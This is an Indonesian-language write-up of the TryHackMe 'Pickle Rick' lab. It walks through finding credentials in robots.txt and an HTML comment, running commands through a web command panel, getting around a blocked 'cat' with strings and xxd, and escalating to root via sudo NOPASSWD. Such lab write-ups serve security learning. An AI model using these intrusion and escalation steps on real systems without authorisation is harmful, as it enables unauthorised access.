# Pickle Rick — TryHackMe Writeup

**Target:** Pickle Rick  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Kategori:** Web, Command Injection, Privilege Escalation  

---

## Recon

```
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  open  http  Apache httpd 2.4.41 (Ubuntu)
```

### Credential Hunting

**robots.txt:**

```
Wubbalubbadubdub
```

**Page source HTML comment:**

```html
<!-- Note to self, remember username! Username: R1ckRul3s -->
```

Credential terkumpul: `R1ckRul3s:Wubbalubbadubdub`

---

## Initial Access — Login Panel

Ditemukan `/login.php` dari hasil recon. Login menggunakan credential dari artifacts yang ditemukan berhasil.

Setelah login, terdapat beberapa tab namun hanya **command panel** yang bisa diakses. Tab lain menampilkan pesan *"Only the REAL rick can view this page.."*

---

## Enumerasi via Command Panel

### Listing File

```bash
ls
```

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

### cat Diblokir

Command `cat` diblokir oleh aplikasi:

```
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

### Bypass dengan strings / xxd / wc

Menggunakan command alternatif untuk membaca file:

```bash
strings Sup3rS3cretPickl3Ingred.txt
xxd Sup3rS3cretPickl3Ingred.txt
wc Sup3rS3cretPickl3Ingred.txt
```

**Bahan pertama: mr. meeseek hair**

### Eksplorasi Filesystem

```bash
ls /
cd /home && ls
# rick  ubuntu

cd /home && cd rick && ls -la
# -rwxrwxrwx 1 root root 13 Feb 10 2019 second ingredients

cd /home && cd rick && strings "second ingredients"
```

**Bahan kedua: 1 jerry tear**

---

## Privilege Escalation — sudo -l

Setelah beberapa lama mencari bahan ketiga, baru tersadar belum menjalankan `sudo -l` — dibantu GPT untuk mengarahkan ke sini.

```bash
sudo -l
```

```
User www-data may run the following commands:
    (ALL) NOPASSWD: ALL
```

www-data bisa menjalankan semua command sebagai root tanpa password.

```bash
sudo ls /root
# 3rd.txt  snap

sudo strings /root/3rd.txt
```

**Bahan ketiga: fleeb juice**

---

## Dead End

Tidak ada rabbit hole teknis di room ini. Dead end-nya lebih ke **lupa menjalankan `sudo -l`** — salah satu command paling basic dalam post-exploitation checklist. Beberapa waktu terbuang mencari bahan ketiga di tempat yang salah sebelum akhirnya diingatkan GPT untuk cek sudo permission.

---

## Ringkasan

| Fase           | Teknik                                        |
|----------------|-----------------------------------------------|
| Recon          | robots.txt + page source → credential hunting |
| Initial Access | Login dengan credential dari artifacts        |
| Enumerasi      | Command panel — bypass cat dengan strings/xxd |
| PrivEsc        | sudo -l → NOPASSWD: ALL → akses /root         |
| Flag           | 3 bahan ditemukan ✅                           |

## Takeaway

Dua poin dari room ini. Pertama, credential sering tersebar di beberapa tempat — robots.txt untuk password, HTML comment untuk username. Selalu cek keduanya sebelum menyerah cari credential. Kedua, `sudo -l` harus jadi reflek pertama setelah dapat shell — di room ini www-data punya akses NOPASSWD: ALL yang berarti root instant, tapi baru ditemukan setelah buang waktu mencari di tempat lain.

